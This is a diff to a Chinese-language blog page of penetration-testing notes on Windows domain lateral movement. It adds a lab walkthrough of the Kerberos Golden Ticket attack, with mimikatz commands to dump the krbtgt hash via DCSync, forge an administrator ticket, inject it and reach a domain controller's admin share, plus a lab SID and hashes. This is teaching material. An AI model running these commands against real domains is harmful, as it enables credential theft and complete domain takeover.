@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">273</span>
+            <span class="post-count">676</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -113,7 +113,7 @@
 
 
 
-
+<span id="more"></span>
 
 
 
@@ -122,11 +122,62 @@
 
 
 
-<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="PTH哈希传递（mimikatz-ntml-hash）"><a href="#PTH哈希传递（mimikatz-ntml-hash）" class="headerlink" title="PTH哈希传递（mimikatz+ntml hash）"></a>PTH哈希传递（mimikatz+ntml hash）</h1><h1 id="PTT票据传递"><a href="#PTT票据传递" class="headerlink" title="PTT票据传递"></a>PTT票据传递</h1><h1 id><a href="#" class="headerlink" title></a></h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><ul>
-<li>ZeroLogon(CVE-2020-1472)</li>
-<li>（CVE-2021-42287 and CVE-2021-42278）只需一个域用户</li>
-</ul>
-<h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><p>利用域管理员导出域内所有用户hash</p>
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内权限维持</p>
+<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225058167.png" alt="image-20220307225058167"></p>
+<p>krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</p>
+<p>如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，<code>即可伪造任意用户身份</code></p>
+<p>需要条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 需要伪造的域用户名（有域管，肯定伪造域管啦）</span><br><span class="line"></span><br><span class="line">2. 该域的域名</span><br><span class="line"></span><br><span class="line">3. krbtgt的ntml hash或者AES-256值</span><br><span class="line"></span><br><span class="line">4. 域krbtgt  SID (去掉-502)     （wmic useraccount get name,sid）</span><br></pre></td></tr></table></figure>
+
+<p>获得krbtgt账号的SID值和ntml hash哈希值     [这个需要我们用域账户（权限太低不行，即域管权限），并且将该用户加入本地管理员组，或者用域管理员方式进行cmd命令执行]</p>
+<ol>
+<li>获得hash等需要的条件信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:shmily.god &#x2F;user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225230207.png" alt="image-20220307225230207"></p>
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225631024.png" alt="image-20220307225631024"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SID        :S-1-5-21-2538459943-234226500-22795540782</span><br><span class="line">ntml hash  :8aecb1498df128a866968668302003bd</span><br><span class="line">aes256     :1f15a3cce65909ed19ff0e5ec6b7102f630be3725b12c66e25251ab0b81305e7 </span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>查询域管理员账号：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308000619676.png" alt="image-20220308000619676"></p>
+<p>注入票据前</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.119.200\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308004612176.png" alt="image-20220308004612176"></p>
+<ol start="3">
+<li>清空会话票据</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308001049876.png" alt="image-20220308001049876"></p>
+<ol start="4">
+<li>生成黄金票据(Administrator.kiribi)</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:shmily.god &#x2F;sid:S-1-5-21-2538459943-234226500-22795540782 &#x2F;krbtgt:8aecb1498df128a866968668302003bd &#x2F;ticket:Administrator.kiribi</span><br><span class="line"></span><br><span class="line"># kerberos::golden &#x2F;user:要伪造的域用户(我们这一般写域管理员) &#x2F;domain:域名 &#x2F;sid:域的sid值 &#x2F;krbtgt:krbtgt的哈希 &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002554785.png" alt="image-20220308002554785"></p>
+<ol start="5">
+<li>注入票据</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002722245.png" alt="image-20220308002722245"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::tgt  查看当前票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002904106.png" alt="image-20220308002904106"></p>
+<ol start="6">
+<li>验证</li>
+</ol>
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308003825467.png" alt="image-20220308003825467"></p>
+<p>使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。</p>
+<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307220404812.png" alt="image-20220307220404812"></p>
+<p>参考：渗透攻击红队公众号</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1653877">内网渗透（四） | 票据传递攻击 - 云+社区 - 腾讯云 (tencent.com)</a></p>
  
       <!-- reward -->
       
